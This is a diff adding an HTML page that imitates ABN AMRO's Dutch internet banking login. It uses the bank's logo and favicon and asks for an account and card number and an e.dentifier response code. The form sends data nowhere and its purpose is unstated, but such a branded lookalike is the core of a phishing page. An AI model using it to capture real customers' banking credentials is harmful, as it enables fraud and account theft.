@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet Bankieren - ABN AMRO</title>
+    <link rel="stylesheet" href="abnamro.css">
+    <link rel="icon" type="image/png" href="abn logo's/abnfavicon.png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <div class="top-bar"></div>
+        <div class="top-bar">
+          <img src="abn logo's/abnamro.svg" alt="ABN AMRO Logo" class="logo">
+      </div>
+    </header>
+    <main>
+        <div class="login-container">
+            <div class="tab-container">
+                <button id="priveTab" class="tab active" onclick="switchTab('prive')">Prive</button>
+                <button id="zakelijkTab" class="tab" onclick="switchTab('zakelijk')">Zakelijk</button>
+                <div class="tab-line"></div>
+                <div class="tab-indicator"></div>
+            </div>
+            <h1>Log in met e.dentifier</h1>
+            <form>
+              <label for="username">Rekening- en pasnummer</label>
+              <input type="text" id="username" name="username" placeholder="NL ** ABNA 0" required>
+              
+              <label for="response">Respons</label>
+              <input type="password" id="response" name="response" placeholder="" required>
+              <button type="submit">Inloggen</button>
+          </form>
+        </div>
+    </main>
+    <script>
+      function switchTab(tab) {
+          const indicator = document.querySelector('.tab-indicator');
+  
+          if (tab === 'prive') {
+              indicator.style.left = "0%";  /* Begint bij de linker rand */
+          } else {
+              indicator.style.left = "50%"; /* Gaat naar de rechter helft */
+          }
+      }
+  </script>
+</body>
+</html>
